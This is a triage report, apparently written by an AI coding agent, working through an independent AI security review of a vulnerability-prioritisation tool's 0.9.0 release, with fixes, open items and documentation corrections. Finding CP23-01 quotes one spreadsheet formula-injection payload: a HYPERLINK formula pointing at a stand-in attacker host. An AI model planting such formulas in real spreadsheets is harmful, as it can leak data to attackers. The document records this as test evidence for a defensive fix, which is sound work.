Reviewer: Claude Code (developer and reviewer), triaging the independent review by OpenAI Codex (reports/independent-review-codex/)
Checkpoint / commit: CP23 (independent AI review of 0.9.0: triage and fixes) / branch independent-review-fixes, before merge
Scope: every finding and every "wrong or unsupported claim" in the Codex report on release 0.9.0 (`v0.9.0`, `e645bce`). Each was reproduced or checked against the code before a verdict was given; the report itself is archived unchanged.
Tools run (with versions): the project's runner (ruff 0.16.10, bandit 1.9.4, semgrep 1.179.0, gitleaks), zizmor 1.30.1, the full suite on a private virtual display, 12 mutation checks on the new tests
Tools not run (and why): osv-scanner and pip-audit (no dependencies); atheris (not yet run for any release; the plan asks for it at release checkpoints and this one is a fix checkpoint, so it stays an open item)

Triage (the owner's decision is needed where marked)
| # | Codex severity | Finding | Verified | Verdict | Status |
| --- | --- | --- | --- | --- | --- |
| 1 | High | Existing inventory headers bypass formula neutralisation | Reproduced: the formula came out unchanged in the output header | Agree | Fixed |
| 2 | Medium | A well-formed but older or smaller threat feed silently replaces better data | Confirmed by reading the code: only structure is checked | Agree, a design decision | **Open: owner's decision** |
| 3 | Medium | CVE extraction is quadratic for a hostile cell | Reproduced: 5,000 ids 0.19 s, 10,000 0.81 s, 20,000 2.8 s | Agree | Fixed |
| 4 | Low | GUI ranked and roll-up exports are not atomic | Confirmed: opened the destination with "w" | Agree | Fixed |
| 5 | Low | Input files opened by name and not proved to be regular, stable files | Confirmed for a named pipe and a growing JSON file | Agree | Fixed for the scanner importer; **open for the older loaders** (decision) |
| 6 | Low | The release workflow can attest an untested or version-mismatched tag | Confirmed by reading the workflow | Agree | Tag-versus-version check added; running the tests before attesting is **open** (decision) |
| 7 | Info | Development tools are pinned by version, not by hash | Confirmed; also flagged by Scorecard | Agree | **Open: owner's decision** |

Finding CP23-01
- Title: Formula injection through the preserved header of an existing inventory
- Severity: High (the reviewer's rating; realistic trigger: an inventory that came from someone else or from a spreadsheet, opened again in a spreadsheet)
- Location: scanimport.write_inventory
- Description: the importer keeps an existing inventory's header cells exactly and wrote them without the formula guard that every data cell goes through.
- Evidence: a header cell `=HYPERLINK("https://attacker.example/collect","Inventory")` came out unchanged (reproduced independently of the reviewer).
- Root cause and prevention: the guard was written for values the tool produces and for cell data; a header copied from the person's own file was treated as trusted structure. Every cell written now goes through the guard, including headers; tests cover each leading character (= + - @ tab, carriage return) and prove the output still loads as an inventory; a mutation check removing the guard is caught; the plan's checklist now says "including header cells copied from an input file".
- Status: fixed. Confidence: Confirmed.

Finding CP23-02
- Title: A schema-valid older or truncated feed replaces the stored threat data
- Severity: Medium
- Location: threatdata.py and icsadvisories.py (install of a download)
- Description: a downloaded KEV, EPSS or advisory file is checked for structure, sizes and counts but not against the stored copy: a hostile or erroneous response from an allowed host, or a TLS-intercepting proxy the workstation trusts, could replace a large, newer set with a tiny valid one, and a CVE that had been listed as exploited would then lose its signal.
- Recommended fix (not applied): for network updates only, refuse a file whose date is older than the stored one, refuse (with a clear message and the previous copy kept) one whose entry count has fallen by more than a stated share, and say so in the Threat data view; keep importing from a file allowed with a label, since the owner chooses the file. The thresholds are a decision.
- Status: open, owner's decision. Until then SECURITY.md says plainly that the files are trusted only as far as HTTPS to the named hosts.
- Confidence: Confirmed.

Finding CP23-03
- Title: Quadratic time in CVE extraction from a hostile cell
- Severity: Medium
- Location: scanimport._cves
- Description: each new id was compared with a list of all earlier ones; a cell of 20,000 distinct ids took 2.8 s and growth was fourfold per doubling, so an 8 MB cell could keep the process busy for a very long time.
- Root cause and prevention: the code deduplicated with a list because cells usually hold a few ids; the cell limit (8 MB) was set for plugin output, not for this loop. A set is used now; a test reads 40,000 distinct ids and fails over 3 s (the old code took about 11 s), and a mutation check restoring the list is caught.
- Status: fixed. Confidence: Confirmed.

Finding CP23-04
- Title: Ranked and roll-up exports written in place
- Severity: Low
- Location: gui_batch.export and export_assets
- Description: the destination was opened for writing before the export finished, so a full disk or a crash could replace a good export with a partial one.
- Root cause and prevention: the scanner import and the command line had been given an atomic writer; the older GUI exports were not revisited. Both now use it; tests make the writer fail half-way and check the existing file, with no temporary file left; mutation checks for both are caught; the plan's checklist now lists atomic writing for every file written over an existing one.
- Status: fixed. Confidence: Confirmed.

Finding CP23-05
- Title: Input files opened by name, not proved to be regular files of limited size
- Severity: Low
- Location: scanimport (readers); batch.py, inventory.py and compare.py read the same way
- Description: a size check on the name followed by a separate open leaves a gap, a named pipe would block for ever, and a JSON file was read whole after the check.
- Root cause and prevention: the older loaders were written for files the person picks in a dialog. The scanner importer now opens each input once through one helper that checks, on the open file, that it is a regular file and within the limit, and reads JSON and XML through a cap (a file that grows after the check is still refused); tests cover a pipe, a device, a folder, growth after the check and closing the file on refusal, and mutation checks for each are caught.
- Status: fixed for the importer. batch.py, inventory.py and compare.py still use the older pattern: it needs a person to choose a pipe or a device, or another local process to swap a file, so the risk is low; extending the helper to them is a small change and is open for the owner's decision.
- Confidence: Likely.

Finding CP23-06
- Title: The release workflow builds and attests any v* tag
- Severity: Low
- Location: .github/workflows/release.yml
- Description: no check that the tag names the version in version.py, that the tests passed, or that the tag is annotated.
- Fix applied: the workflow now stops, before building, when the tag is not `v` plus the version in version.py (the logic was run locally for a matching and a mismatching tag; zizmor pedantic is clean). Not applied: requiring the tests to pass on the tagged commit inside the workflow (it would make a release run take about as long as CI; branch protection already requires CI on main before a tag is made) and requiring annotated tags.
- Status: partly fixed; the rest is open, owner's decision. Confidence: Confirmed.

Finding CP23-07
- Title: Development tools pinned by version, not by hash
- Severity: Info
- Location: .github/workflows/ci.yml and security.yml, requirements-dev.txt
- Description: a replaced package under an existing version number would run on the CI runner; the permissions of those jobs are read-only, which limits the damage. The test plan asked for hashes; only the runtime requirements (none) meet that.
- Recommended fix (not applied): a requirements file with hashes, installed with `pip install --require-hashes`, covering the transitive packages of semgrep and the other tools (Dependabot can keep it current).
- Status: open, owner's decision; the plan's wording now says exactly what is pinned.
- Confidence: Confirmed.

Documented claims the reviewer found wrong or unsupported
| Claim | Verdict | Change |
| --- | --- | --- |
| Formula-safe output everywhere | True except the header (CP23-01) | Fixed in code |
| Downloads "validated completely before use" | Too strong | SECURITY.md now says: checked for structure, trusted only as far as HTTPS to the named hosts, and a well-formed but incomplete or older file would be accepted |
| The SBOM shows the application has no dependencies | It shows an empty environment, and omits the Python runtime and Tcl/Tk | README now says exactly that |
| "The same files always produce the same bytes" | Not shown across environments | README, SECURITY.md and RELEASING.md now say what was shown: GitHub's runner and a developer's Linux machine matched for 0.9.0, and a very different environment may differ |
| The full-history secret scan could not be checked | The review copy was made with `--depth 1` (a choice of the person who prepared it); the repository's history is complete and gitleaks scans all of it in CI | Explained in reports/independent-review-codex/README.md |
| Release provenance not verified | It was verified after the review's snapshot: the 0.9.0 attestation, checked with `gh attestation verify` on 2026-10-14, names `release.yml` at `refs/tags/v0.9.0` and commit `e645bce` | PS.2 in docs/SECURITY_FRAMEWORKS.md updated |

Suppressions added / removed: none added; one removed (the `noqa: SIM115` on the old open call in `scanimport.py`, no longer needed because files are opened through one helper). The baseline was refreshed so the removed allowance cannot be reused (50 to 49 entries; the only change is that entry).
SSDF practices touched: PW.7 (a review by a second party), PW.8 (new regression tests), PS.2 (attestation verified), RV.3 (root causes recorded).

Release gate for this change
| Gate | Evidence | Pass |
| --- | --- | --- |
| Every finding reproduced or checked before a verdict | table above | Yes |
| Each fixed finding has a regression test that fails on the old code | 12 mutation checks, all caught | Yes |
| No change to bucket logic or scores | only writers, readers and wording changed | Yes |
| The independent report is archived unchanged | reports/independent-review-codex/ (byte-identical copy) | Yes |
| Open findings stated, with a recommendation | CP23-02, -05 (older loaders), -06 (rest), -07 | Yes, awaiting the owner |
| Documentation corrected where a claim was wrong | README, SECURITY.md, plan, RELEASING.md, SECURITY_FRAMEWORKS.md | Yes |
